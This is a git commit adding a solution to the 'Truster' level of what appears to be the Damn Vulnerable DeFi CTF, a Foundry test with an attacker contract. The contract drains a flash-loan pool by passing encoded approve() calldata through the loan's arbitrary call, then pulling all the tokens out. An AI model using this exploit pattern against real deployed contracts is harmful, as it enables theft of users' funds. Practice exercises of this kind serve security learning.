aa9d7685b7354f34b061d78c8c6e0b4656e20238
Chua, Shu Ern <shuernchua@kapps.com.sg>
2023-11-30 14:46:33 +0800

    Truster

--- test/Levels/truster/Truster.t.sol
+++ test/Levels/truster/Truster.t.sol
@@ -3,9 +3,42 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
+import {console2} from "forge-std/console2.sol";
+
+contract LenderPoolAttacker {
+    TrusterLenderPool public target;
+    IERC20 public token;
+    address public attackerWallet;
+
+    constructor(address _target) {
+        target = TrusterLenderPool(_target);
+        token = target.damnValuableToken();
+        attackerWallet = msg.sender;
+    }
+
+    // Step 1 fail the transfer
+    // Step 2 target is dmv
+    // Step 3 function call to approve Attacker Contract as the Lender Pool's Spender
+    // Step 4 After Flash Loan Scope, do transferFrom Pool to Attacker Contract
+    // Step 5 Transfer from Attacker Contract to Wallet
+
+    function attack() public {
+        address borrower = address(this);
+        uint256 borrowAmount = 0;
+        address tokenContract = address(token);
+        uint256 amount = token.balanceOf((address(target)));
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
+        target.flashLoan(borrowAmount, borrower, tokenContract, data);
+        //end of flash loan scope
+        token.transferFrom(address(target), address(this), amount);
+        uint256 myBalance = token.balanceOf(address(this));
+        token.transfer(attackerWallet, myBalance);
+    }
+}
 
 contract Truster is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -41,6 +74,13 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        console2.log("attacker address:", attacker);
+        console2.log("address of lenderpool:", address(trusterLenderPool));
+        LenderPoolAttacker attackerContract = new LenderPoolAttacker(address(trusterLenderPool));
+        console2.log("address of attacker Contract:", address(attackerContract));
+        attackerContract.attack();
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
